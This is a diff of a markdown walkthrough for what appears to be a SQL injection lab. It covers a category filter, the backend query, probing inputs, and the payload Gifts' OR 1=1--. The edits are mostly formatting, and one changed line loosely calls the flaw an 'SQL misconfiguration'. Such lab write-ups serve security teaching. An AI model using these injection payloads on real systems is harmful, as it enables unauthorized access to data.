@@ -5,7 +5,7 @@
 
 ### Info: The injection point is the product category filter
 `target.com/filter?category=<input>`
-### Info: The query is in the form
+### Info: The backend query is:
 `SELECT * FROM products WHERE category = '<input>' AND released = 1`
 <br><br><br>
 
@@ -13,20 +13,20 @@
 
 category=Gifts'
 
-`500: server error`
+`500: server error`<br><br>
 
 category=Gifts'--
 
 `200`
 
-This confirms that the server is inserting our input directly into the query
+This indicates the existence of an SQL misconfiguration.
 <br><br>
 
 **<ins>Step 2: Exploit the vulnerability</ins>**
 
 category=Gifts' OR 1=1--
 
-`Success!`
+`Success!`<br><br>
 
 This request sends the server this query:
 
